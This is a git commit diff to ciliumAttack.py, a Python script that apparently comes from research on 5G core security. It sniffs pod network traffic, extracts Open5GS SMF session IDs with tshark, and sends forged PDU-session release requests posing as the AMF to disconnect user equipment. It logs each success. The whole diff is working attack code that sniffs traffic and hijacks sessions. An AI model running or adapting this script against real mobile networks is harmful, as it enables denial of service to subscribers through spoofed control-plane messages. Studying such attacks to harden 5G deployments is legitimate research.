a166ec14906d4a7fc3596488c2df6797a0328f50
UmakantKulkarni <UmakantKulkarni@users.noreply.github.com>
2024-12-15 23:58:12 -0500

    Update ciliumAttack.py

--- ciliumAttack.py
+++ ciliumAttack.py
@@ -1,10 +1,16 @@
 #!/usr/bin/env python3
 
+import logging
 from scapy.all import sniff, wrpcap
 from scapy.layers.inet import IP, TCP
 import os
 import subprocess
 import time
+import re
+
+# Configure logging
+logging.basicConfig(level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 URI_PATTERN = "http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/"
 TEMP_PCAP = "/tmp/temp_packet.pcap"
@@ -23,6 +29,7 @@ TSHARK_CMD = [
     "-e",
     "http2.header.value",  # Extract header value
 ]
+ATTACKED_UES = []
 
 
 def process_with_tshark(packet):
@@ -38,20 +45,22 @@ def process_with_tshark(packet):
                 parts = line.split("\t")
                 if len(parts) >= 2:
                     ip_src = parts[0]
-                    uri = parts[1]
-                    print(f"Source IP: {ip_src}, URI: {uri}")
-
-                    # Extract the session ID from the URI
-                    session_id = uri.split("/")[-1]
-                    print(f"Session ID: {session_id}")
-
-                    # Trigger a POST request
-                    post_to_server(ip_src, session_id)
+                    uriop = parts[1]
+                    match = re.search(r'https?://[^\s,]+', uriop)
+                    if match:
+                        uri = match.group(0)
+                        session_id = uri.split("/")[-1]
+                        if session_id not in ATTACKED_UES:
+                            ATTACKED_UES.append(session_id)
+                            logging.info(f"URI: {uri}")
+                            logging.info(f"Session ID: {session_id}")
+                            post_to_server(ip_src, session_id)
 
         except subprocess.CalledProcessError as e:
-            print(f"Tshark processing error: {e.output.decode('utf-8')}")
+            logging.warning(
+                f"Tshark processing error: {e.output.decode('utf-8')}")
         except Exception as e:
-            print(f"Error processing packet with tshark: {e}")
+            logging.warning(f"Error processing packet with tshark: {e}")
         finally:
             # Clean up the temporary .pcap file
             if os.path.exists(TEMP_PCAP):
@@ -60,42 +69,58 @@ def process_with_tshark(packet):
 
 def post_to_server(ip_src, session_id):
     try:
-        url = f"http://open5gs-smf/nsmf-pdusession/v1/sm-contexts/{session_id}/release"
+        url = "http://{}/nsmf-pdusession/v1/sm-contexts/{}/release".format(
+            os.getenv("OPEN5GS_SMF_PORT_80_TCP_ADDR"), session_id)
         data = '{"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"208","mnc":"93"},"tac":"000001"},"ncgi":{"plmnId":{"mcc":"208","mnc":"93"},"nrCellId":"000000010"},"ueLocationTimestamp":"2022-11-30T03:19:48.206301Z"}},"ueTimeZone":"-05:00"}'
         headers = {"Content-Type": "application/json", "User-Agent": "AMF"}
-        subprocess.run([
-            "curl",
-            "-s",
-            "-o",
-            "/dev/null",
-            "-w",
-            "%{http_code}",
-            "--http2-prior-knowledge",
-            "--request",
-            "POST",
-            "-d",
-            data,
-            "-H",
-            f"Content-Type: {headers['Content-Type']}",
-            "-A",
-            headers["User-Agent"],
-            url,
-        ],
-                       check=True)
-        print(
-            f"\nPOST request sent to {url} for Source IP {ip_src} and Session ID {session_id}"
+        # Run the curl command and capture the HTTP response code
+        result = subprocess.run(
+            [
+                "curl",
+                "-s",
+                "-o",
+                "/dev/null",
+                "-w",
+                "%{http_code}",  # Only get the HTTP response code
+                "--http2-prior-knowledge",
+                "--request",
+                "POST",
+                "-d",
+                data,
+                "-H",
+                f"Content-Type: {headers['Content-Type']}",
+                "-A",
+                headers["User-Agent"],
+                url,
+            ],
+            text=True,
+            capture_output=True,
+            check=True,
         )
+
+        response_code = result.stdout.strip()
+        if response_code == "204":
+            logging.info(f"Attack Successful for User-ID {session_id}")
+        else:
+            logging.info(
+                f"Attack failed with response code {response_code} for User-ID {session_id}"
+            )
+
+    except subprocess.CalledProcessError as e:
+        logging.warning(f"Error sending POST request: {e}")
     except Exception as e:
-        print(f"\nError sending POST request: {e}")
+        logging.warning(f"Unexpected error: {e}")
 
 
-def run(intf="cilium_wg0", attack_enabled=False):
+def run(attack_enabled=False):
     # Start sniffing packets
     if attack_enabled == "true":
-        print("Starting packet capture...")
-        sniff(iface=intf, filter="tcp src port 80", prn=process_with_tshark)
+        logging.info("Starting packet capture...")
+        sniff(iface=os.listdir('/sys/class/net/'),
+              filter="tcp src port 80",
+              prn=process_with_tshark)
     else:
-        print("Not carrying out the attack.")
+        logging.info("Not carrying out the attack.")
         while True:
             time.sleep(1)
 
@@ -103,4 +128,4 @@ def run(intf="cilium_wg0", attack_enabled=False):
 if __name__ == "__main__":
     from sys import argv
 
-run(intf=str(argv[1]), attack_enabled=str(argv[2]))
+    run(attack_enabled=str(argv[1]))
